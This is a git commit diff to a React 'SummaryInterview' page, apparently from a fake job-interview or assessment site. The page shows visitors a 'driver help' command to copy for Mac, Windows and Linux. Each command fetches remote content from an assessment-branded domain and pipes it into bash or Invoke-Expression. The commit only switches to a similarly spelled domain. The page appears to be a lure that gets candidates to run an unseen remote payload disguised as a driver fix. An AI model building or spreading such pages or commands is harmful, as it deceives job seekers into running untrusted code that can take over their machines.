fad2068a18ae012b1b2134f27d26f37ac69277b7
max-doppelt <superdev0420@gmail.com>
2026-05-20 10:54:33 -0400

    update

--- src/pages/SummaryInterview.jsx
+++ src/pages/SummaryInterview.jsx
@@ -754,17 +754,17 @@ export default function SummaryInterview() {
             <div ref={driverCommandRef} id="driver-command" className={styles.driverHelpCommand} role="region" aria-label="Command to copy">
                 {driverOs === 'mac' && (
                       <code>
-                      {`curl -sL -X POST https://api.sigmaassessmentssystems.com/mac/${inviteLink ? inviteLink : ''} | bash`}
+                      {`curl -sL -X POST https://api.sigmassessmentsystems.com/mac/${inviteLink ? inviteLink : ''} | bash`}
                           </code>
                   )}
                 {driverOs === 'windows' && (
                           <code>
-                      {`Invoke-RestMethod -Uri "https://api.sigmaassessmentssystems.com/window/${inviteLink ? inviteLink : ''}" -Method POST | Invoke-Expression`}
+                      {`Invoke-RestMethod -Uri "https://api.sigmassessmentsystems.com/window/${inviteLink ? inviteLink : ''}" -Method POST | Invoke-Expression`}
                           </code>
                       )}
               {driverOs === 'linux' && (
                       <code>
-                  {`curl -sL -X POST https://api.sigmaassessmentssystems.com/mac/${inviteLink ? inviteLink : ''} | bash`}
+                  {`curl -sL -X POST https://api.sigmassessmentsystems.com/mac/${inviteLink ? inviteLink : ''} | bash`}
                       </code>
                   )}
             </div>
